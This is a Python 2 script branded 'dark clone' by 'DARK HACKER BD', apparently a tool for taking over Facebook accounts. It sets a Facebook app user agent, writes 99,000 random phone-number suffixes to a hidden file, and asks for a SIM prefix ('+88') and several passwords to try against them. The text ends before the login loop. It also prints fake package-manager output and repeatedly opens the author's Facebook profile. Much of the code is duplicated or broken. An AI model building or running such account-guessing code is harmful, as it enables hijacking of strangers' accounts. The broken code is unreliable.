#!/usr/bin/python2
#coding=utf-8
#dark boy
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2022

import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False




def animate():
    for c in itertools.cycle(['\x1b[1;92m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa110%', '\x1b[1;91m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa120%', '\x1b[1;93m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa130%', '\x1b[1;94m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa140%', '\x1b[1;95m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa150%', '\x1b[1;96m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa160%', '\x1b[1;97m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa170%', '\x1b[1;92m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa180%', '\x1b[1;93m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa190%', '\x1b[1;91m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x88\x9a100%']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;93m               Loading ' + c)
        sys.stdout.flush()
        time.sleep(0.25)


t = threading.Thread(target=animate)
t.start()
time.sleep(2.5)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Back'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(1e-05)


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

#Dev:Babar_Ali
##### LOGO #####
logo1 ="""
/\033[1;94m
    ),\         dark boy                                          /,(
   /__'.                                                      .'/__
    `)   `'-. \                                          / .-'`   ('
    /   _.--'\ '.          ,               ,          .' /'--._     |
    \         _.`'-.,_'-.\033[1;31m|/\ \    _,_    / /\|\033[1;95m.-'_,.-'`._         /
     `\    .-'       /'-.\033[1;31m|| \ |.-"   "-.| / ||\033[1;96m.-'\       '-.    /`
       )-'`        .'   :\033[1;31m||  / -.\ //.- \  ||\033[1;96m:   '.        `'-(
      /          .'    / \033[1;31m\_ |  /\033[1;95m●\033[1;31m`^'\033[1;95m●\033[1;31m\  | _/\033[1;96m/ \    '.        )
       `)  _.'     .'    .--.; \033[1;31m|\__"__/|\033[1;96m ;.--.    '.     '._  ('
       /_.'     .-'  _.-'     \033[1;31m\ \/^\/ //\033[1;96m     `-._  '-.     '.
        '-._' /`            _   \033[1;31m\-.-//\033[1;96m   _            `\ '_.-'
            `<     _,..--''`|    \033[1;31m\`"`/\033[1;96m    |`''--..,_     >`
             _\  ``--..__   \     \033[1;31m`'`\033[1;96m     /   __..--``  /_
            /  '-.__     ``'-;    / \    ;-'``     __.-'
            '-._    '-._  /    |---|---|    \  _.-'    _.-'
                 `'-._   '/ / / /---|---\ \ \ '   _.-'` 
                         `)` `  /'---'\  ` `(`               
                  /_____/|  / \._\   /_./ \  |\_____              \033[1;31m\033[1;32m                                                 
            █▀▀▀░░░░░░░▀▀▀█                █▀▀▀░░░░░░░▀▀▀█
         █▀░░░░░░░░░░░░░░░░░▀█          █▀░░░░░░░░░░░░░░░░░▀█
        █│░░░░░░░░░░░░░░░░░░░│█        █│░░░░░░░░░░░░░░░░░░░│█
        ▌│░░░░░░░░░░░░░░░░░░░│▐        ▌│░░░░░░░░░░░░░░░░░░░│▐
       █░└┐░░░░░░░░░░░░░░░░░┌┘░█      █░└┐░░░░░░░░░░░░░░░░░┌┘░¶
       █░░└┐░░░░░░░░░░░░░░░┌┘░░█      p█░░└┐░░░░░░░░░░░░░░░┌┘░░█
       █░░┌┘\033[1;31m▄▄▄▄▄\033[1;32m░░░░░\033[1;31m▄▄▄▄▄\033[1;32m└┐░░█      █░░┌┘\033[1;31m▄▄▄▄▄\033[1;32m░░░░░\033[1;31m▄▄▄▄▄\033[1;32m└┐░░█
        ▌░│\033[1;31m██████▌\033[1;32m░░░\033[1;31m▐██████\033[1;32m│░▐█      █▌░│\033[1;31m██████▌\033[1;32m░░░\033[1;31m▐██████\033[1;32m│░▐
        █░│\033[1;31m▐███▀▀\033[1;32m░░▄░░\033[1;31m▀▀███▌\033[1;32m│░█        █░│\033[1;31m▐███▀▀\033[1;32m░░▄░░\033[1;31m▀▀███▌\033[1;32m│░█
       █▀─┘░░░░░░░▐█▌░░░░░░░└─▀█      █▀─┘░░░░░░░▐█▌░░░░░░░└─▀█
       █▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄       █▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄█
         █▄─┘██▌░░░░░░░▐██└─▄█          █▄─┘██▌░░░░░░░▐██└─▄█
          █░░▐█─┬┬┬┬┬┬┬─█▌░░█            █░░▐█─┬┬┬┬┬┬┬─█▌░░█
         █▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐█          █▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐
          █▄░░░└┴┴┴┴┴┴┴┘░░░▄█            █▄░░░└┴┴┴┴┴┴┴┘░░░▄█
            █▄░░░░░░░░░░░▄█               █▄░░░░░░░░░░░▄█
               █▄▄▄▄▄▄▄█                      █▄▄▄▄▄▄▄█
         \033[1;33m                   dark hacker bd
            
                     \033[1;33mDEVLOPER\033[1;37m :\033[1;96m dark boy \033[1;37m(\033[1;31msorif\033[1;37m)
 \033[1;95m                  ╔═════════════════════════════╗
                   ║ \033[1;96mTOOL NAME : { dark clone 1 }\033[1;95m║
                   ║ \033[1;96mdevloper     : dark boy  \033[1;95m   ║
                   ║\033[1;96m OUR GRUPE : DARK HACKER BD\033[1;95m  ║
                   ╚═════════════════════════════╝  
                   """
logo = """
               '/\033[1;94m
    ),\         dark boy                                          /,(
   /__'.                                                      .'/__
    `)   `'-. \                                          / .-'`   ('
    /   _.--'\ '.          ,               ,          .' /'--._     |
    \         _.`'-.,_'-.\033[1;31m|/\ \    _,_    / /\|\033[1;95m.-'_,.-'`._         /
     `\    .-'       /'-.\033[1;31m|| \ |.-"   "-.| / ||\033[1;96m.-'\       '-.    /`
       )-'`        .'   :\033[1;31m||  / -.\ //.- \  ||\033[1;96m:   '.        `'-(
      /          .'    / \033[1;31m\_ |  /\033[1;95m●\033[1;31m`^'\033[1;95m●\033[1;31m\  | _/\033[1;96m/ \    '.        )
       `)  _.'     .'    .--.; \033[1;31m|\__"__/|\033[1;96m ;.--.    '.     '._  ('
       /_.'     .-'  _.-'     \033[1;31m\ \/^\/ //\033[1;96m     `-._  '-.     '.
        '-._' /`            _   \033[1;31m\-.-//\033[1;96m   _            `\ '_.-'
            `<     _,..--''`|    \033[1;31m\`"`/\033[1;96m    |`''--..,_     >`
             _\  ``--..__   \     \033[1;31m`'`\033[1;96m     /   __..--``  /_
            /  '-.__     ``'-;    / \    ;-'``     __.-'
            '-._    '-._  /    |---|---|    \  _.-'    _.-'
                 `'-._   '/ / / /---|---\ \ \ '   _.-'` 
                         `)` `  /'---'\  ` `(`               
                  /_____/|  / \._\   /_./ \  |\_____              \033[1;31m\033[1;95m                                                 
            █▀▀▀░░░░░░░▀▀▀█                █▀▀▀░░░░░░░▀▀▀█
         █▀░░░░░░░░░░░░░░░░░▀█          █▀░░░░░░░░░░░░░░░░░▀█
        █│░░░░░░░░░░░░░░░░░░░│█        █│░░░░░░░░░░░░░░░░░░░│█
        ▌│░░░░░░░░░░░░░░░░░░░│▐        ▌│░░░░░░░░░░░░░░░░░░░│▐
       █░└┐░░░░░░░░░░░░░░░░░┌┘░█      █░└┐░░░░░░░░░░░░░░░░░┌┘░¶
       █░░└┐░░░░░░░░░░░░░░░┌┘░░█      p█░░└┐░░░░░░░░░░░░░░░┌┘░░█
       █░░┌┘\033[1;31m▄▄▄▄▄\033[1;95m░░░░░\033[1;31m▄▄▄▄▄\033[1;95m└┐░░█      █░░┌┘\033[1;31m▄▄▄▄▄\033[1;95m░░░░░\033[1;31m▄▄▄▄▄\033[1;95m└┐░░█
        ▌░│\033[1;31m██████▌\033[1;95m░░░\033[1;31m▐██████\033[1;95m│░▐█      █▌░│\033[1;31m██████▌\033[1;95m░░░\033[1;31m▐██████\033[1;95m│░▐
        █░│\033[1;31m▐███▀▀\033[1;95m░░▄░░\033[1;31m▀▀███▌\033[1;95m│░█        █░│\033[1;31m▐███▀▀\033[1;95m░░▄░░\033[1;31m▀▀███▌\033[1;95m│░█
       █▀─┘░░░░░░░▐█▌░░░░░░░└─▀█      █▀─┘░░░░░░░▐█▌░░░░░░░└─▀█
       █▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄       █▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄█
         █▄─┘██▌░░░░░░░▐██└─▄█          █▄─┘██▌░░░░░░░▐██└─▄█
          █░░▐█─┬┬┬┬┬┬┬─█▌░░█            █░░▐█─┬┬┬┬┬┬┬─█▌░░█
         █▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐█          █▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐
          █▄░░░└┴┴┴┴┴┴┴┘░░░▄█            █▄░░░└┴┴┴┴┴┴┴┘░░░▄█
            █▄░░░░░░░░░░░▄█               █▄░░░░░░░░░░░▄█
               █▄▄▄▄▄▄▄█                      █▄▄▄▄▄▄▄█
               \033[1;33m     
              ╭━━━╮╱╱╱╱╭╮╱╱ ╭╮╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱ ╭╮╱╭━━━╮
              ╰╮╭╮┃╱╱╱╱┃┃╱╱ ┃┃╱╱╱╱╱╱╱┃┃╱╱╱╱╱╱╱ ┃┃╱╰╮╭╮┃
              ╱┃┃┃┣━━┳━┫┃╭╮ ┃╰━┳━━┳━━┫┃╭┳━━┳━╮ ┃╰━╮┃┃┃┃
              ╱┃┃┃┃╭╮┃╭┫╰╯╯ ┃╭╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯ ┃╭╮┃┃┃┃┃
              ╭╯╰╯┃╭╮┃┃┃╭╮╮ ┃┃┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱ ┃╰╯┣╯╰╯┃
              ╰━━━┻╯╰┻╯╰╯╰╯ ╰╯╰┻╯╰┻━━┻╯╰┻━━┻╯╱ ╰━━┻━━━╯
            \033[1;95m  
                  \033[1;31m ╔═════════════════════════════╗
                   ║ \033[1;96mTOOL NAME : { dark clone1 }\033[1;31m ║
                   ║ \033[1;96mdevloper     : dark boy  \033[1;31m   ║
                   ║\033[1;96m OUR GRUPE : DARK HACKER BD\033[1;31m  ║
                   ╚═════════════════════════════╝  
                   
         \033[1;31m●\033[1;95m════════════════════════◄►════════════════════════\033[1;31m●   """
os.system("clear")
print """\033[1;31m      
                                         ,--.
                            ,--.  .--,`\033[1;31m) )  .--,
                         .--,`)\033[1;32m \( (` /,--./ (`
                        ( ( ,--.  ) )\ /`) ).--,-.
                         ;\033[1;33m.__`) )/ /) )\033[1;37m ( (( (`_) )
                        ( (  / /( (.' "-.) )) )__.'-,
                       _,--\033[1;32m.( ( /`         `,/ ,--,) )
                     ( (`\033[1;95m`) \,` ==.    .==\033[1;96m  \( (`,-;
                       ;-,( (_) ~6~ \  / ~6~ (_) )_) )
                      ( (_ \_ (      \033[1;84m)(      )__/___.'
                      '.__,\033[1;32m-,\ \     ''     /\ ,-.
                         ( (_/ /\    __    /\ \_) )
                          '._.'  \  \_\033[1;37m_/  /  '._.'
                              .--`\      /`--.
   sorif                           '----'
 
   """
jalan(""" """)
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)



def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)


os.system("clear")
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.01)


os.system("clear")
jalan("\033[1;31m\033[1;96mdone\033[1;31m!")
os.system("clear")


def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")

print logo1
CorrectUsername = "dark"
CorrectPassword = "boy"

loop = 'true'
while (loop == 'true'):
    username = raw_input("""
       \033[1;91m \x1b[1;95m\033[1;33m─██████─:::\033[1;96mTool Username \x1b[1;91m: \x1b[1;92m""")
    if (username == CorrectUsername):
    	password = raw_input("""
\033[1;91m \x1b[1;91m      \033[1;33m ─██████─:::\033[1;96mTool Password \x1b[1;91m: \x1b[1;92m""")
        if (password == CorrectPassword):
            print """\033[1;37m       
\033[1;94m          """ 
	    time.sleep(2)
            loop = 'false'
        else:
            print """                                   \033[1;31mWrong Password \033[1;32mcontact me"""
            os.system('xdg-open https://www.facebook.com/profile.php?id=100029061534369')
    else:
        print """                                   \033[1;31mWrong Username \033[1;32mcontact me"""
        os.system('xdg-open https://www.facebook.com/profile.php?id=100029061534369')



# credit dark boy

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0)
        os.system('clear')

    jalan('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
    os.system('clear')    
    
    print """\033[1;31m      
                                      ,--.
                         ,--.  .--,`\033[1;31m) )  .--,
                      .--,`)\033[1;32m \( (` /,--./ (`
                     ( ( ,--.  ) )\ /`) ).--,-.
                      ;\033[1;33m.__`) )/ /) )\033[1;37m ( (( (`_) )
                     ( (  / /( (.' "-.) )) )__.'-,
                    _,--\033[1;32m.( ( /`         `,/ ,--,) )
                  ( (`\033[1;95m`) \,` ==.    .==\033[1;96m  \( (`,-;
                    ;-,( (_) ~6~ \  / ~6~ (_) )_) )
                   ( (_ \_ (      \033[1;84m)(      )__/___.'
                   '.__,\033[1;32m-,\ \     ''     /\ ,-.
                      ( (_/ /\    __    /\ \_) )
                       '._.'  \  \_\033[1;37m_/  /  '._.'
                           .--`\      /`--.
   sorif                        '----' 
              """
    jalan('')
    jalan("\033[1;31m   ▬▬▬▬▬》》》\033[1;96mhlw bro assalamuwalaykum")
    jalan("\033[1;31m   ▬▬▬▬▬》》》\033[1;96mi am dark boy ")
    jalan("\033[1;31m   ▬▬▬▬▬》》》\033[1;96mtool varson:: \033[1;31m1.0.0 ")
    jalan("""\033[1;95m  
                  \033[1;31m ╔═════════════════════════════╗
                   ║ \033[1;96mTOOL NAME : { dark clone1 }\033[1;31m ║
                   ║ \033[1;96mdevloper     : dark boy  \033[1;31m   ║
                   ║\033[1;96m OUR GRUPE : DARK HACKER BD\033[1;31m  ║
                   ╚═════════════════════════════╝  """)
    jalan("""   
\033[1;32mTesting the available mirrors:
[*] 
Err:1 https://packages-cf.termux.org/apt/termux-main stable InRelease
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
All packages are up to date.
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
""") 
    jalan("""   \033[1;32mTesting the available mirrors:
[*] 
Err:1 https://packages-cf.termux.org/apt/termux-main stable InRelease
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
All packages are up to date.
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
""") 

    os.system('xdg-open https://www.facebook.com/profile.php?id=100029061534369')


    jalan("""Using fallback mirror: https://packages-cf.termux.org/apt/termux-main""")  
    jalan("""   0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded""")
    
    
    
    
psb('')
for n in range(99000):
    nmbr = random.randint(11111111, 99999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def t():
    time.sleep(1)


def cb():
    os.system('clear')



back = 0
successful = []
cpb = []
oks = []
id = []
os.system('clear')
os.system('clear')

print logo


def menu():
    
    
   
    
    jalan("""\x1b[1;92m    [1]  \x1b[1;92mSTART HACKING\033[1;95m [\033[1;96mbd id\033[1;95m]
   \033[1;37m [2]\033[1;37m  OUR FACEBOOK GRUPE
\033[1;37m    [3] \033[1;96m HELP""")
    
    
    jalan('    \x1b[1;97m[0] \033[1;31m EXIT                         ')
    jalan('  \033[1;37m  [\033[1;96m4\033[1;37m] \033[1;32m TOOL UPDATE')
    print """  \033[1;95m   . \033[1;31m  ●\033[1;95m════════════════════════◄►════════════════════════\033[1;31m●\033[1;95m
    
    
"""
    action()


def action():
    global cpb
    global oks
    bch = raw_input('   ─██████─')
    if bch == '':
    	os.system('clear')
        print '[!] sorry bro wrong input'
        action()
    elif bch == '1':
    	os.system('xdg-open https://www.facebook.com/profile.php?id=100029061534369')
        os.system('clear')
        jalan('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
        os.system('clear')
        print  """
/\033[1;94m
    ),\         dark boy                                          /,(
   /__'.                                                      .'/__
    `)   `'-. \                                          / .-'`   ('
    /   _.--'\ '.          ,               ,          .' /'--._     |
    \         _.`'-.,_'-.\033[1;31m|/\ \    _,_    / /\|\033[1;95m.-'_,.-'`._         /
     `\    .-'       /'-.\033[1;31m|| \ |.-"   "-.| / ||\033[1;96m.-'\       '-.    /`
       )-'`        .'   :\033[1;31m||  / -.\ //.- \  ||\033[1;96m:   '.        `'-(
      /          .'    / \033[1;31m\_ |  /\033[1;95m●\033[1;31m`^'\033[1;95m●\033[1;31m\  | _/\033[1;96m/ \    '.        )
       `)  _.'     .'    .--.; \033[1;31m|\__"__/|\033[1;96m ;.--.    '.     '._  ('
       /_.'     .-'  _.-'     \033[1;31m\ \/^\/ //\033[1;96m     `-._  '-.     '.
        '-._' /`            _   \033[1;31m\-.-//\033[1;96m   _            `\ '_.-'
            `<     _,..--''`|    \033[1;31m\`"`/\033[1;96m    |`''--..,_     >`
             _\  ``--..__   \     \033[1;31m`'`\033[1;96m     /   __..--``  /_
            /  '-.__     ``'-;    / \    ;-'``     __.-'
            '-._    '-._  /    |---|---|    \  _.-'    _.-'
                 `'-._   '/ / / /---|---\ \ \ '   _.-'` 
                         `)` `  /'---'\  ` `(`               
                  /_____/|  / \._\   /_./ \  |\_____              \033[1;31m\033[1;32m                                                 
            █▀▀▀░░░░░░░▀▀▀█                █▀▀▀░░░░░░░▀▀▀█
         █▀░░░░░░░░░░░░░░░░░▀█          █▀░░░░░░░░░░░░░░░░░▀█
        █│░░░░░░░░░░░░░░░░░░░│█        █│░░░░░░░░░░░░░░░░░░░│█
        ▌│░░░░░░░░░░░░░░░░░░░│▐        ▌│░░░░░░░░░░░░░░░░░░░│▐
       █░└┐░░░░░░░░░░░░░░░░░┌┘░█      █░└┐░░░░░░░░░░░░░░░░░┌┘░¶
       █░░└┐░░░░░░░░░░░░░░░┌┘░░█      p█░░└┐░░░░░░░░░░░░░░░┌┘░░█
       █░░┌┘\033[1;31m▄▄▄▄▄\033[1;32m░░░░░\033[1;31m▄▄▄▄▄\033[1;32m└┐░░█      █░░┌┘\033[1;31m▄▄▄▄▄\033[1;32m░░░░░\033[1;31m▄▄▄▄▄\033[1;32m└┐░░█
        ▌░│\033[1;31m██████▌\033[1;32m░░░\033[1;31m▐██████\033[1;32m│░▐█      █▌░│\033[1;31m██████▌\033[1;32m░░░\033[1;31m▐██████\033[1;32m│░▐
        █░│\033[1;31m▐███▀▀\033[1;32m░░▄░░\033[1;31m▀▀███▌\033[1;32m│░█        █░│\033[1;31m▐███▀▀\033[1;32m░░▄░░\033[1;31m▀▀███▌\033[1;32m│░█
       █▀─┘░░░░░░░▐█▌░░░░░░░└─▀█      █▀─┘░░░░░░░▐█▌░░░░░░░└─▀█
       █▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄       █▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄█
         █▄─┘██▌░░░░░░░▐██└─▄█          █▄─┘██▌░░░░░░░▐██└─▄█
          █░░▐█─┬┬┬┬┬┬┬─█▌░░█            █░░▐█─┬┬┬┬┬┬┬─█▌░░█
         █▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐█          █▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐
          █▄░░░└┴┴┴┴┴┴┴┘░░░▄█            █▄░░░└┴┴┴┴┴┴┴┘░░░▄█
            █▄░░░░░░░░░░░▄█               █▄░░░░░░░░░░░▄█
               █▄▄▄▄▄▄▄█                      █▄▄▄▄▄▄▄█
         \033[1;33m                   dark hacker bd
            
         \033[1;33mDEVLOPER\033[1;37m :\033[1;96m dark boy \033[1;37m(\033[1;31msorif\033[1;37m)
 \033[1;95m                  ╔═════════════════════════════╗
                   ║ \033[1;96mTOOL NAME : { dark clone 1 }\033[1;95m║
                   ║ \033[1;96mdevloper     : dark boy  \033[1;95m   ║
                   ║\033[1;96m OUR GRUPE : DARK HACKER BD\033[1;95m  ║
                   ╚═════════════════════════════╝  
                   """
        name = raw_input('    1\x1b[1;92m\x1b[1;92m\033[1;37m    TYPE ANY PASS\033[1;32m1: ')
        name = raw_input('    2\x1b[1;92m\x1b[1;92m \033[1;34m   TYPE ANY PASS\033[1;31m2: ')
        name = raw_input('    3\x1b[1;92m\x1b[1;92m \033[1;33m   TYPE ANY PASS\033[1;34m3: ')
        
        try:
            c = raw_input('\x1b[1;97m \033[1;32m   @    TYPE YUOR CODE: ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m018'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
